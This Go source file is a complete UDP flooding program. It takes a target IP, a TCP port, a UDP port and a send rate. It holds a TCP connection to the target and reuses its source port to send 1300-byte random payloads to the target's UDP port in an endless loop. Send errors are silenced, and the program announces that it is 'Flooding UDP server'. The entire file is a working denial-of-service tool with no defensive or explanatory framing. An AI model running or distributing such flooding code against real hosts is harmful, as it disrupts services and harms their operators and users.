package main

import (
	"math/rand"
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

func main() {
	// Check command-line arguments
	if len(os.Args) < 5 {
		fmt.Println("Usage: go run main.go <IP> <TCP Port> <UDP Port> <Packets per Second>")
		return
	}

	// Get command-line arguments
	ip := os.Args[1]
	tcpPort := os.Args[2]
	udpPort := os.Args[3]
	packetsPerSecond, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("Invalid value for Payloads per Second:", err)
		return
	}

	// Connect to TCP server
	tcpAddr, err := net.ResolveTCPAddr("tcp", ip+":"+tcpPort)
	if err != nil {
		fmt.Println("Failed to resolve TCP address:", err)
		return
	}

	tcpConn, err := net.DialTCP("tcp", nil, tcpAddr)
	if err != nil {
		fmt.Println("Failed to connect to TCP server:", err)
		return
	}
	defer tcpConn.Close()

	fmt.Println("Connected to TCP server")

	// Get source port from TCP connection
	tcpLocalAddr := tcpConn.LocalAddr().(*net.TCPAddr)
	sourcePort := tcpLocalAddr.Port

	// Send payload over UDP
	udpAddr, err := net.ResolveUDPAddr("udp", ip+":"+udpPort)
	if err != nil {
		fmt.Println("Failed to resolve UDP address:", err)
		return
	}

	udpConn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, udpAddr)
	if err != nil {
		fmt.Println("Failed to connect to UDP server:", err)
		return
	}
	defer udpConn.Close()

	fmt.Println("Connected to UDP server")

	// Calculate delay between payloads
	delay := time.Second / time.Duration(packetsPerSecond)

	// Start flooding
	fmt.Printf("Flooding UDP server with %d packets per second\n", packetsPerSecond)
	for {
		// Check if TCP connection is still open
		err = tcpConn.SetReadDeadline(time.Now())
		if err != nil {
			fmt.Println("TCP connection closed")
			break
		}

		payload := generateRandomPayload(1300)

		// Send payload
		_, err = udpConn.Write(payload)
		if err != nil {
			//fmt.Println("Failed to send payload:", err)
			//return
		}

		time.Sleep(delay)
	}
}


// Function to generate random payload of given size
func generateRandomPayload(size int) []byte {
	payload := make([]byte, size)
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < size; i++ {
		payload[i] = byte(rand.Intn(256))
	}
	return payload
}
